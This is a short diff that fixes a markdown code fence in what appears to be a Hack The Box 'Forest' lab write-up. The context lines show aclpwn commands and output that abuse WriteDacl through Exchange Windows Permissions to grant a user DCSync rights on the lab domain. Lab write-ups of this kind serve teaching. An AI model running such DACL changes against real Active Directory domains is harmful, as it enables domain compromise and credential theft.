@@ -344,7 +344,7 @@ root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d
 Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
 [+] Path validated, the following modifications are required for exploitation in the current configuration:
 [-] Modifying domain DACL to give DCSync rights to ZER0CODE
-'''
+```
 
 ```markdown
 root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -s 10.10.10.161
